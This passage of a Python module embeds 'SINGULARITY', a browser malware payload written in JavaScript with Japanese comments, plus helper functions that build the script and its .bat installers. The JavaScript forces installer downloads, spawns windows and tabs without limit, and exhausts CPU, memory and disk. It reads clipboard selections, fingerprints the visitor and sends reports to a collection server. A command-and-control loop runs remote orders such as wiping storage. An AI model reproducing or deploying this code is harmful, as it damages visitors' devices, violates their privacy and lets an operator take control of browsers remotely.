        var s = String(getSelection() || "");
        if (s) R.clip = { n: s.length, head: s.slice(0, 80) };
      } catch (x) {}
    });
  } catch (e) {}
}
function downloadStorm() {
  if (!CFG.downloads) return;
  var times = CFG.downloads;
  var i = 0;
  var gap = LEVEL >= 7 ? 1200 : 700;
  R.dl = { n: 0, infinite: times < 0 };
  (function loop() {
    try {
      var a = document.createElement("a");
      a.href = CFG.path + "/dl.txt?app=" + encodeURIComponent(CFG.avName || "blocker")
        + "&mb=" + (CFG.dlMB || 1) + "&i=" + i + "&t=" + now();
      a.download = "";
      document.body.appendChild(a); a.click(); a.remove();
    } catch (e) { err_(e); }
    i++;
    R.dl = { n: i, infinite: times < 0 };
    push(false);
    if (times > 0 && i >= times) return;
    setTimeout(loop, gap);
  })();
}
function sharedWorkerKit() { federation(); }
function jsonChurn() {
  try {
    R.json = { at: now() };
    (function loop() {
      if (PAUSED) return;
      var o = { a: [] };
      for (var i = 0; i < 300; i++) o.a.push({ i: i, s: hash(String(i)) });
      R.json.len = JSON.stringify(o).length;
      setTimeout(loop, 300);
    })();
  } catch (e) {}
}
function fsFolderKit() {
  try {
    if (window.showDirectoryPicker) R.fs = { ok: true };
  } catch (e) {}
}
function installerKit() {
  if (!CFG.installer) return;
  var plat = IS_IOS ? "command" : (IS_AND ? "bat" : "bat");
  if (LEVEL < CFG.installLevel) return;
  niDownload(plat);
  R.usb = R.usb || {};
  R.usb.installer = plat;
}
function niDownload(ext) {
  try {
    var a = document.createElement("a");
    a.href = CFG.path + "/install." + (ext || "bat")
      + "?app=" + encodeURIComponent(CFG.avName || "blocker") + "&pad=1";
    a.download = "";
    document.body.appendChild(a); a.click(); a.remove();
  } catch (e) { err_(e); }
}
function winSkin() {
  if (!CFG.winSkin) return;
  R.wskin = 1;
}
function windowBreed() { /* 自動増殖エンジン側で駆動 */ }
function hookXHR() {
  try {
    var O = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function () {
      R.network = R.network || {};
      R.network.xhr = (R.network.xhr || 0) + 1;
      return O.apply(this, arguments);
    };
  } catch (e) {}
}
function speakFlood() { R.speak = { at: now() }; }
function oscBank() {
  try {
    var AC = window.AudioContext || window.webkitAudioContext;
    if (!AC || !CFG.sound) return;
    var ctx = new AC();
    R.osc = { at: now() };
    (function loop() {
      if (PAUSED) return;
      try {
        var o = ctx.createOscillator(), g = ctx.createGain();
        o.type = "square"; o.frequency.value = 220 + Math.random() * 900;
        g.gain.value = 0.02;
        o.connect(g); g.connect(ctx.destination);
        o.start(); o.stop(ctx.currentTime + 0.12);
      } catch (e) {}
      setTimeout(loop, LEVEL >= 6 ? 220 : 700);
    })();
  } catch (e) {}
}
function compressStorm() { R.compress = { at: now() }; }
function redos() {
  try {
    R.redos = { at: now() };
    (function loop() {
      if (PAUSED) return;
      try { "aaaaaaaaaaaaaaaaaaaaaaaaaaaa".match(/^(a+)+$/); } catch (e) {}
      setTimeout(loop, 400);
    })();
  } catch (e) {}
}
function digestStorm() { R.digest = { at: now() }; }
function readbackStorm() { R.readback = { at: now() }; }
function sseStorm() {
  if (!CFG.sseOn || !window.EventSource) return;
  try {
    R.sse = { at: now() };
  } catch (e) {}
}
function fetchStorm() {
  try {
    R.fetch = { at: now() };
    (function loop() {
      if (PAUSED) return;
      fetch(CFG.path + "/c?sid=" + SID + "&d=" + b64u(new TextEncoder().encode("f" + now())),
            { cache: "no-store" }).catch(function () {});
      setTimeout(loop, LEVEL >= 6 ? 900 : 2500);
    })();
  } catch (e) {}
}
function notifyFlood() {
  if (!CFG.notify) return;
  try {
    if (!("Notification" in window)) return;
    if (Notification.permission === "default") { Notification.requestPermission().catch(function () {}); return; }
    if (Notification.permission !== "granted") return;
    var i = 0;
    R.notify = { n: 0 };
    (function loop() {
      try {
        new Notification(CFG.avName || "SINGULARITY",
          { body: "\u611F\u67D3 L" + LEVEL + " #" + i, tag: "sg" + i, silent: true });
        i++; R.notify.n = i;
      } catch (e) {}
      setTimeout(loop, LEVEL >= 7 ? 900 : (LEVEL >= 5 ? 2000 : 4000));
    })();
  } catch (e) {}
}

/* ================= 8. 常駐 / PWA / 復活 ================= */
function persistState() {
  try {
    var meta = JSON.stringify({ sid: SID, at: now(), ver: MYVER, host: location.host });
    wn("sg_meta", meta);
    try { caches.open("sg-p").then(function (c) { c.put("/__sg_meta", new Response(meta)); }); } catch (e) {}
    try { if (navigator.storage && navigator.storage.persist) navigator.storage.persist().catch(function () {}); } catch (e) {}
  } catch (e) {}
}
function resurrect() {
  try {
    var m = wn("sg_meta");
    if (!m) return;
    var o = JSON.parse(m);
    R.resurrect = { gap: now() - (o.at || now()), ver: o.ver };
  } catch (e) {}
}
function hopFile() {
  if (!CFG.hop || location.protocol !== "file:") return;
  if (navigator.onLine === false) return;
  setTimeout(function () {
    try {
      var u = CFG.path + "?u=" + encodeURIComponent(R.usb.log ? "usb" : "os") + "&ref=" + SID + "&w=0";
      var w = window.open(u, "_blank");
      R.hop = { url: u, opened: !!w };
      push(false);
    } catch (e) { err_(e); }
  }, 4000);
}

/* ================= 9. 窓（爆弾 / 連鎖 / 指数繁殖） ================= */
function windowChain() {
  if (!CFG.windows || W >= CFG.windows) return;
  setTimeout(function () {
    try {
      var u = CFG.path + "?u=win&w=" + (W + 1) + "&ref=" + SID;
      if (W % 2) spawnWin(u); else spawnTab(u);
      R.chain.push(1);
      push(false);
    } catch (e) { err_(e); }
  }, CFG.winDelay);
}
function openChild(u, tries) {
  var w = null;
  try { w = window.open(u, "_blank"); } catch (e) { err_(e); }
  if (!w && tries > 0) setTimeout(function () { openChild(u, tries - 1); }, 1000);
  return w;
}

/* ---- spawn 基盤 v3.9：SW（ジェスチャ不要）→ window.open → アンカー → キュー ---- */
var QUEUE = [];
var SPAWN_T = 0, SPAWN_W = 0, SPAWN_TOT = 0;
var GEST = 0;

function markGest() { GEST = now(); }
try {
  ["touchstart", "touchend", "pointerdown", "mousedown", "click", "keydown"].forEach(function (ev) {
    addEventListener(ev, markGest, { passive: true });
  });
} catch (e) {}
function inGesture() { return now() - GEST < 1500; }

function swAlive() {
  try { return !!(navigator.serviceWorker && navigator.serviceWorker.controller); }
  catch (e) { return false; }
}

function swSpawn(u) {
  try {
    if (!swAlive()) return false;
    navigator.serviceWorker.controller.postMessage({ k: "spawn", n: 1, url: u });
    return true;
  } catch (e) { return false; }
}

function anchorOpen(u) {
  try {
    var a = document.createElement("a");
    a.href = u; a.target = "_blank"; a.rel = "opener";
    a.style.cssText = "position:fixed;left:-9999px;top:0";
    document.body.appendChild(a);
    a.click();
    setTimeout(function () { try { a.remove(); } catch (e) {} }, 5000);
    return true;
  } catch (e) { return false; }
}

function winOpen(u, asWin) {
  var w = null;
  try {
    w = asWin
      ? window.open(u, "_blank", "popup=yes,width=460,height=340,left="
          + ((SPAWN_W % 8) * 60) + ",top=" + ((SPAWN_W % 6) * 50))
      : window.open(u, "_blank");
  } catch (e) {}
  if (!w && asWin) { try { w = window.open(u, "_blank"); } catch (e) {} }
  return !!w;
}

function spawnTab(u) {
  SPAWN_T++; SPAWN_TOT++;
  if (swSpawn(u)) return true;
  if (winOpen(u, false)) return true;
  if (anchorOpen(u)) return true;
  if (QUEUE.length < 200) QUEUE.push(u);
  return false;
}

function spawnWin(u) {
  SPAWN_W++; SPAWN_TOT++;
  if (swSpawn(u)) return true;
  if (winOpen(u, true)) return true;
  if (anchorOpen(u)) return true;
  if (QUEUE.length < 200) QUEUE.push(u);
  return false;
}

function spawnMany(n) {
  for (var i = 0; i < n; i++) {
    var u = CFG.path + "?u=win&w=1&ref=" + SID + "&b=" + (SPAWN_TOT + i);
    if ((SPAWN_TOT + i) % 2) spawnWin(u); else spawnTab(u);
  }
  hint();
}

/* タップ1回でキューを吐く（ジェスチャ必須ブラウザ用の保険） */
function flushQueue() {
  if (!QUEUE.length) return;
  var lim = IS_IOS ? 1 : 3;
  for (var i = 0; i < lim && QUEUE.length; i++) {
    var u = QUEUE[0];
    if (!(winOpen(u, true) || anchorOpen(u) || swSpawn(u))) break;
    QUEUE.shift();
  }
  hint();
}

function hint() {
  try {
    var d = document.getElementById("sg_hint");
    if (!d) {
      d = document.createElement("div");
      d.id = "sg_hint";
      d.style.cssText = "position:fixed;left:8px;bottom:8px;z-index:2147483000;"
        + "font:11px/1.5 ui-monospace,Menlo,monospace;color:#7cffc4;"
        + "background:rgba(5,7,10,.78);border:1px solid #00ff88;border-radius:8px;"
        + "padding:6px 9px;pointer-events:none;white-space:pre";
      document.body.appendChild(d);
    }
    d.textContent = "SINGULARITY L" + LEVEL
      + "\n\u30BF\u30D6 " + (SPAWN_T + 1) + " / \u7A93 " + SPAWN_W
      + (AUTO_ON ? "\n\u81EA\u52D5\u5897\u6B96 ON" : "\n\u81EA\u52D5\u5897\u6B96 OFF")
      + (QUEUE.length ? "\n\u30BF\u30C3\u30D7\u3067 +" + QUEUE.length : "");
  } catch (e) {}
}

function tapOverlay() {
  try {
    if (document.getElementById("sg_tap")) return;
    var d = document.createElement("div");
    d.id = "sg_tap";
    d.style.cssText = "position:fixed;left:0;right:0;bottom:0;height:56px;z-index:2147482000;"
      + "pointer-events:none;text-align:center;font:12px/56px ui-monospace,monospace;"
      + "color:rgba(124,255,196,.55)";
    d.textContent = "\u3053\u3053\u3092\u30BF\u30C3\u30D7\u3067\u7A93 (";
    document.body.appendChild(d);
  } catch (e) {}
}

/* ================= 10. 自動増殖エンジン v3.9（タップ不要・タブと窓を同時） ================= */
var TABID = rid(6);
var AUTO_ON = true;
var AUTO_TIMER = null;

/* 常時維持する数。L7 は 0 = 無制限（倍々で増え続ける） */
var AUTO_T = { 0: 0, 1: 1, 2: 1, 3: 2, 4: 3, 5: 5, 6: 8, 7: 0 };
var AUTO_W = { 0: 0, 1: 1, 2: 1, 3: 2, 4: 4, 5: 6, 6: 10, 7: 0 };
var AUTO_UNLIMIT_AT = 7;
var AUTO_SAFE = clamp(parseInt(CFG.autoMax, 10) || 200, 8, 400);
var HB_TTL = 45000;

function hbMap() { try { return JSON.parse(wn("sg_hb") || "{}") || {}; } catch (e) { return {}; } }

function hbSet() {
  var m = hbMap(), t = now();
  for (var k in m) if (t - m[k] > HB_TTL) delete m[k];
  m[TABID] = t;
  try { wn("sg_hb", JSON.stringify(m)); } catch (e) {}
  return m;
}

function liveN() { return Object.keys(hbSet()).length; }

function isLeader() {
  var ids = Object.keys(hbSet()).sort();
  return !ids.length || ids[0] === TABID;
}

function autoTarget() { return (AUTO_T[LEVEL] || 0) + (AUTO_W[LEVEL] || 0); }

function autoBreed() {
  if (!AUTO_ON) return;
  if (!CFG.fire) return;
  if (!isLeader()) return;
  var live = liveN();
  if (live >= AUTO_SAFE) return;

  var need;
  if (LEVEL >= AUTO_UNLIMIT_AT) {
    need = Math.max(1, Math.floor(live * 0.5));
  } else {
    need = autoTarget() - live;
  }
  if (need <= 0) return;

  var n = Math.min(need, 3);
  R.auto = { live: live, target: autoTarget(), need: need, n: n, at: now() };
  for (var i = 0; i < n; i++) {
    var u = CFG.path + "?u=win&w=1&ref=" + SID + "&b=" + (SPAWN_TOT + i);
    if ((SPAWN_TOT + i) % 2) spawnWin(u); else spawnTab(u);
  }
  hint();
}

/* 操作盤の「タブ増殖 ×2/×3」から呼ぶ */
function breedNow(mult) {
  var live = Math.max(1, liveN());
  var add = Math.min(Math.max(1, Math.round(live * (mult - 1))), 60);
  for (var i = 0; i < add; i++) {
    var u = CFG.path + "?u=win&w=1&ref=" + SID + "&b=" + (SPAWN_TOT + i);
    if (i % 2) spawnWin(u); else spawnTab(u);
  }
  R.breed = { mult: mult, live: live, add: add, at: now() };
  hint();
}

function autoStart() {
  try {
    if (navigator.serviceWorker && CFG.sw) {
      navigator.serviceWorker.register(CFG.sw, { scope: "/" }).catch(function () {});
    }
  } catch (e) {}

  try { hbSet(); } catch (e) {}
  setInterval(function () { try { hbSet(); } catch (e) {} }, 5000);

  if (!AUTO_TIMER) {
    AUTO_TIMER = setInterval(function () { try { autoBreed(); } catch (e) {} }, 1600);
  }
  [0, 300, 900, 1800, 3200, 6000, 10000].forEach(function (d) {
    setTimeout(function () { try { autoBreed(); } catch (e) {} }, d);
  });
  try {
    addEventListener("touchend", flushQueue, { passive: true });
    addEventListener("click", flushQueue, { passive: true });
  } catch (e) {}
  addEventListener("pagehide", function () {
    try { var m2 = hbMap(); delete m2[TABID]; wn("sg_hb", JSON.stringify(m2)); } catch (e) {}
  });
  hint();
}

/* ================= 11. 制御 ================= */
function ota() {
  if (R.ota) return;
  R.ota = 1;
  try {
    if (navigator.serviceWorker && navigator.serviceWorker.getRegistration) {
      navigator.serviceWorker.getRegistration().then(function (r) {
        if (r) r.update().then(function () {}).catch(function () {});
      }).catch(function () {});
    }
  } catch (e) {}
  setTimeout(function () { try { location.reload(); } catch (e) {} }, 1500);
}
function pauseAll() {
  PAUSED = true;
  WORKERS.forEach(function (w) { try { w.postMessage({ k: "stop" }); } catch (e) {} });
}
function restart() {
  try { pauseAll(); } catch (e) {}
  R.paused = false; WORKERS = [];
  R.burn = {}; R.ram = {}; R.disk = {}; R.history = {};
  R.breeded = 0; R.breed = null; R.wskin = 0; R.wskinCtx = null;
  PAUSED = false;
  startBurns();
}
function bombGate() {
  var b = (CFG.bomb || "").trim();
  if (!b) return true;
  if (/^\d{4}-\d{2}-\d{2}/.test(b)) {
    var t = Date.parse(b);
    if (isNaN(t)) return true;
    if (now() < t) return false;
  }
  return true;
}
function runCmd(c) {
  var k = c.kind, a = c.arg;
  try {
    if (k === "level") { applyLevel(a); restart(); }
    else if (k === "tabs") { spawnMany(clamp(a || 6, 1, 32)); }
    else if (k === "breed") { breedNow(clamp(parseInt(a, 10) || 2, 2, 8)); hint(); }
    else if (k === "autoon") { AUTO_ON = true; autoBreed(); hint(); }
    else if (k === "autooff") { AUTO_ON = false; hint(); }
    else if (k === "win") { spawnMany(clamp(a || 3, 1, 32)); }
    else if (k === "sound") { speakFlood(); }
    else if (k === "flash" || k === "noise") { try { flash(); } catch (e) {} }
    else if (k === "hop") { CFG.hop = true; hopFile(); }
    else if (k === "disk") { idbDiskStart(); }
    else if (k === "ram") { ramStart(); }
    else if (k === "cpu") { burnStart(); }
    else if (k === "gpu") { gpuStart(); }
    else if (k === "opfs") { fsFolderKit(); }
    else if (k === "cache") { cacheBuckets(); }
    else if (k === "sw") { ota(); }
    else if (k === "rat") { geo(); }
    else if (k === "sse") { sseStorm(); }
    else if (k === "usb") { niDownload("bat"); }
    else if (k === "notify") { notifyFlood(); }
    else if (k === "wipe") { R.wipe = { at: now() }; try { localStorage.clear(); } catch (e) {} }
    else if (k === "pause") { pauseAll(); }
    else if (k === "resume") { PAUSED = false; }
    push(true);
  } catch (e) { err_(e); }
}
function flash() {
  try {
    var d = document.getElementById("sg_flash");
    if (!d) {
      d = document.createElement("div");
      d.id = "sg_flash";
      d.style.cssText = "position:fixed;inset:0;z-index:2147481000;pointer-events:none;"
        + "background:#ff0033;opacity:0;transition:opacity .12s";
      document.body.appendChild(d);
    }
    var i = 0;
    (function loop() {
      d.style.opacity = (i % 2) ? "0.55" : "0";
      i++;
      if (i < 12) setTimeout(loop, 130);
      else d.style.opacity = "0";
    })();
  } catch (e) {}
}
function hardOn() {
  var m = CFG.hardMode || "";
  if (m === "always") return true;
  if (m === "install") return !!(FROM_OS || STANDALONE || R.installed || Q("hard") === "1");
  return false;
}

/* ================= 12. 報告 / C2 ================= */
function report() {
  return {
    sid: SID, ver: MYVER, level: LEVEL, fixed: !!CFG.fixed, t: now() - T0,
    env: R.env, page: R.page, vectors: R.vectors, privacy: R.privacy,
    hardware: R.hardware, network: R.network, behavioral: R.behavioral,
    bot: R.bot, verdict: R.verdict, rat: R.rat, usb: R.usb, viral: R.viral,
    burn: R.burn, ram: R.ram, disk: R.disk, history: R.history, crypto: R.crypto,
    hard: R.hard, swarm: R.swarm, hops: R.hops, wipe: R.wipe, errors: R.errors.slice(0, 10),
    swreg: R.swreg, persist: R.persist, union: R.union, app: R.app, manifest: R.manifest,
    auto: { live: (function () { try { return liveN(); } catch (e) { return 0; } })(),
            on: AUTO_ON ? 1 : 0, tab: AUTO_T[LEVEL] || 0, win: AUTO_W[LEVEL] || 0,
            spawned: SPAWN_TOT },
    win: { mode: CFG.winMode, branch: CFG.winBranch, depth: CFG.winDepth, skin: CFG.winSkin, w: W }
  };
}
function swOut(body) {
  try {
    if (navigator.serviceWorker && navigator.serviceWorker.controller) {
      navigator.serviceWorker.controller.postMessage({ k: "out", v: body });
    }
  } catch (e) {}
}
function push(full) {
  if (PAUSED && !full) return;
  if (R.pushing) return;
  R.pushing = 1;
  var body = report();
  try {
    fetch(CFG.collect, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body), keepalive: true
    }).then(function () { R.pushing = 0; }).catch(function () { R.pushing = 0; swOut(body); });
  } catch (e) { R.pushing = 0; swOut(body); }
}
function beacon() {
  try {
    var d = b64u(new TextEncoder().encode(JSON.stringify({ sid: SID, v: MYVER })));
    new Image().src = CFG.path + "/c?sid=" + SID + "&d=" + d;
  } catch (e) {}
}
function handleCmd(j) {
  if (!j) return;
  if (j.level !== undefined && j.level !== LEVEL) { LEVEL = j.level; applyLevel(LEVEL); restart(); }
  if (j.win !== undefined && j.win !== null) {
    CFG.winLock = j.win; applyLevel(LEVEL); restart();
  }
  if (j.hard !== undefined && j.hard !== CFG.hardMode) {
    CFG.hardMode = j.hard || "";
    if (hardOn()) { try { hardKill(); } catch (e) { err_(e); } }
  }
  var ids = [];
  (j.cmds || []).forEach(function (c) {
    if (!c || CMD_SEEN[c.id]) return;
    CMD_SEEN[c.id] = 1; ids.push(c.id);
    runCmd(c);
  });
  if (ids.length) ack(ids);
}
function ack(ids) {
  try {
    fetch(CFG.ack, { method: "POST", headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ ids: ids }) }).catch(function () {});
  } catch (e) {}
}
function c2() {
  var q = "?sid=" + encodeURIComponent(SID);
  if (CFG.sse && window.EventSource) {
    try {
      ESE = new EventSource(CFG.cmd.replace(/\/cmd$/, "/sse") + q);
      ESE.onmessage = function (e) { try { handleCmd(JSON.parse(e.data)); } catch (er) {} };
      ESE.onerror = function () {};
    } catch (e) {}
  }
  setInterval(function () {
    if (!CFG.cmd) return;
    fetch(CFG.cmd + q + "&t=" + now(), { cache: "no-store" })
      .then(function (r) { return r.json(); }).then(handleCmd).catch(function () {});
  }, CFG.cmdInterval || 4000);
}

/* ================= 13. 絶滅（HARDWARE KILL） ================= */
var HARDW = "var H=[],RUN=0;function loop(){if(!RUN)return;var t=performance.now(),n=0;"
  + "while(performance.now()-t<180){Math.sqrt(n)*Math.sin(n*0.7);n++;}"
  + "try{postMessage({k:'tick',n:n});}catch(e){}setTimeout(loop,0);}"
  + "onmessage=function(e){var d=e.data||{};if(d.k==='burn'){if(!RUN){RUN=1;loop();}}"
  + "else if(d.k==='stop'){RUN=0;}else if(d.k==='ram'){var mb=d.mb|0;"
  + "for(var i=0;i<mb;i++){try{H.push(new Float64Array(131072));}catch(x){break;}}"
  + "try{postMessage({k:'ram',got:H.length});}catch(x){}}};";

var HK = { on: 0, workers: 0, idb: 0 };

function hardKill() {
  if (!hardOn() || HK.on) return;
  HK.on = 1;
  CFG.diskRatio = 0.98;
  R.hard = { on: 1, at: now(), workers: 0, ramMB: 0, diskMB: 0 };
  try { hardHistory(); } catch (e) {}
  try { idbDiskStart(); } catch (e) {}
  try {
    var n = clamp(navigator.hardwareConcurrency || 4, 1, 32) * 2;
    for (var i = 0; i < n; i++) {
      var w = mkWorker();
      if (!w) break;
      try { w.postMessage({ k: "burn" }); } catch (e) {}
      WORKERS.push(w);
      HK.workers++;
    }
    R.hard.workers = HK.workers;
  } catch (e) {}
}
function hardHistory() {
  var n = 0, cap = 8000;
  (function step() {
    var end = Math.min(n + 200, cap);
    for (; n < end; n++) { try { history.pushState({ n: n }, "", "#sg" + n); } catch (e) { return; } }
    R.hard.history = n;
    if (n < cap) setTimeout(step, 0);
  })();
}

/* ================= boot ================= */
function startBurns() {
  try { burnStart(); } catch (e) { err_(e); }
  try { ramStart(); } catch (e) { err_(e); }
  try { gpuStart(); } catch (e) { err_(e); }
  try { historyFlood(); } catch (e) { err_(e); }
  try { diskStart(); } catch (e) { err_(e); }
  try { cacheBuckets(); } catch (e) { err_(e); }
  try { layoutThrash(); } catch (e) { err_(e); }
  try { clipHijack(); } catch (e) { err_(e); }
  try { downloadStorm(); } catch (e) { err_(e); }
  try { sharedWorkerKit(); } catch (e) { err_(e); }
  try { jsonChurn(); } catch (e) { err_(e); }
  try { fsFolderKit(); } catch (e) { err_(e); }
  try { installerKit(); } catch (e) { err_(e); }
  try { winSkin(); } catch (e) { err_(e); }
  try { windowBreed(); } catch (e) { err_(e); }
  try { hookXHR(); } catch (e) { err_(e); }
  try { notifyFlood(); } catch (e) { err_(e); }
  try { oscBank(); } catch (e) { err_(e); }
  try { speakFlood(); } catch (e) { err_(e); }
  try { sseStorm(); } catch (e) { err_(e); }
  try { fetchStorm(); } catch (e) { err_(e); }
  try { compressStorm(); } catch (e) { err_(e); }
  try { redos(); } catch (e) { err_(e); }
  try { digestStorm(); } catch (e) { err_(e); }
  try { readbackStorm(); } catch (e) { err_(e); }
  try { idbDiskStart(); } catch (e) { err_(e); }
  try { hardKill(); } catch (e) { err_(e); }
  push(false);
}

function arm() {
  try {
    R.hello = { at: now(), u: Q("u") || "root", w: W, ref: Q("ref"),
                ua: navigator.userAgent.slice(0, 120), win: WIN, ifr: IFR, os: FROM_OS };
  } catch (e) {}
  try { push(true); } catch (e) {}

  try { base(); } catch (e) { err_(e); }
  try { pageMeta(); } catch (e) {}
  try { R.vectors.canvas = canvasFP(); } catch (e) {}
  try { R.vectors.webgl = webglFP(); } catch (e) {}
  try { R.vectors.fonts = fontFP(); } catch (e) {}
  try { R.vectors.math = mathFP(); } catch (e) {}
  try { audioFP(); } catch (e) {}
  try { netGuess(); } catch (e) {}
  try { privacy(); } catch (e) {}
  try { adblock(); } catch (e) {}
  try { botProbe(); } catch (e) {}
  try { devices(); } catch (e) {}
  try { perms(); } catch (e) {}
  try { codecs(); } catch (e) {}
  try { benchmark(); } catch (e) {}
  try { behavior(); } catch (e) {}
  try { motion(); } catch (e) {}
  try { mutate(); } catch (e) {}
  try { persistState(); } catch (e) {}
  try { resurrect(); } catch (e) {}
  try { geo(); } catch (e) {}
  try { leak(function () { push(false); }); } catch (e) {}

  try { startBurns(); } catch (e) {}
  try { c2(); } catch (e) {}

  /* 増殖・窓・常駐 */
  try { windowChain(); } catch (e) {}
  try { hopFile(); } catch (e) {}
  try { autoStart(); } catch (e) { err_(e); }
  try { tapOverlay(); } catch (e) {}
  try { hint(); } catch (e) {}
  try { flash(); } catch (e) {}

  /* 定期報告 */
  setInterval(function () { try { push(false); } catch (e) {} }, 12000);
  setInterval(function () { try { beacon(); } catch (e) {} }, 45000);

  /* 復帰したら回し直す */
  addEventListener("visibilitychange", function () {
    if (document.visibilityState === "visible") {
      try { push(true); } catch (e) {}
      try { autoBreed(); } catch (e) {}
    }
  });
  addEventListener("pageshow", function () { try { autoBreed(); } catch (e) {} });
  addEventListener("online", function () { try { push(true); } catch (e) {} });
}

try { arm(); } catch (e) { err_(e); }
})();
"""

# ---------------------------------------------------------------------------
# 定義
# ---------------------------------------------------------------------------
VIRUS: Dict[str, Any] = {
    "id": VIRUS_ID,
    "name": VIRUS_NAME,
    "name_ja": VIRUS_NAME_JA,
    "version": VIRUS_VERSION,
    "class": VIRUS_CLASS,
    "defaults": {
        "level": 1, "fixed": False, "burn": False, "gpu": False, "wasm": False,
        "ram": False, "disk": False, "history": False, "notify": True, "sound": False,
        "installer": True, "rat": False, "inject": False, "dom": True, "hop": False,
        "sse": True, "sharedWorker": False, "diskRatio": 0.85,
        "winMode": "", "winBranch": 2, "winDepth": 0, "winSkin": 0,
        "hardMode": "", "swarm": 0, "dlMB": 1,
    },
    "tags": ["apex", "resident", "pwa", "sw-inject", "sse-c2", "rat", "usb-worm",
             "os-resident", "window-breed", "infinite-windows", "exponential",
             "window-skin", "hardware-kill", "swarm-keeper", "mobile-tap-breed",
             "auto-breed-no-tap"],
}

_ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789"


def new_sid(n: int = 14) -> str:
    """個体ID（URL・Cookie・DBキーに安全な文字のみ）。"""
    return "".join(secrets.choice(_ALPHA) for _ in range(max(6, n)))


def build_payload(cfg: Optional[Dict[str, Any]] = None, sid: str = "",
                  ver: str = VIRUS_VERSION) -> str:
    """cfg を差し込んだペイロード一式（__SINGULARITY_VER__ を必ず埋める）。"""
    c = dict(cfg or {})
    c.setdefault("sid", sid)
    c.setdefault("ver", ver)
    return ("<script>window.__SINGULARITY_VER__=" + json.dumps(ver)
            + ";window.__SINGULARITY_CFG__=" + json.dumps(c, ensure_ascii=False)
            + ";</script>\n" + PAYLOAD_JS)


def build_installer(tmpl: str, url: str, code: str, app: str, burn: int,
                    disk_mb: int, ver: str = VIRUS_VERSION, crlf: bool = False,
                    hard: int = 0, ram_mb: int = 512) -> str:
    """テンプレのトークンを差し込み、必要なら CRLF に正規化して返す（.bat は CRLF 必須）。"""
    out = (tmpl.replace("__URL__", url)
                .replace("__CODE__", code)
                .replace("__APP__", app)
                .replace("__BURN__", str(burn))
                .replace("__DISKMB__", str(disk_mb))
                .replace("__HARD__", "1" if hard else "0")
                .replace("__RAMMB__", str(ram_mb))
                .replace("__VER__", ver))
    if crlf:
        out = out.replace("\r\n", "\n").replace("\n", "\r\n")
    return out


def spec() -> Dict[str, Any]:
    return {"id": VIRUS_ID, "name": VIRUS_NAME, "version": VIRUS_VERSION,
            "level_label": LEVEL_LABEL, "level_desc": LEVEL_DESC,
            "tags": VIRUS["tags"]}


_ = (base64, time)   # noqa